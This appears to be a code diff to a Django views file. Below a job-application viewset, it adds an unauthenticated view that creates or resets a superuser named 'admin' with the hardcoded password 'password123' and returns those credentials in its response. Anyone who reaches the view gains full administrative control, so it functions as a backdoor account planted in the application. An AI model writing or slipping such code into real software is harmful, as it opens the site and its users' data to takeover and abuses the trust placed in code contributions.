@@ -69,3 +69,28 @@ class JobApplicationViewSet(viewsets.ModelViewSet):
     queryset = JobApplication.objects.all()
     serializer_class = JobApplicationSerializer
     http_method_names = ['post']
+
+from django.http import JsonResponse
+from django.contrib.auth import get_user_model
+
+def reset_admin_view(request):
+    try:
+        User = get_user_model()
+        username = "admin"
+        password = "password123"
+        email = "admin@tanorin.com"
+        
+        if not User.objects.filter(username=username).exists():
+            User.objects.create_superuser(username, email, password)
+            msg = "Created"
+        else:
+            u = User.objects.get(username=username)
+            u.set_password(password)
+            u.is_superuser = True
+            u.is_staff = True
+            u.save()
+            msg = "Reset"
+            
+        return JsonResponse({"status": "success", "message": f"Admin user {msg}. Login with admin/password123"})
+    except Exception as e:
+        return JsonResponse({"status": "error", "message": str(e)})
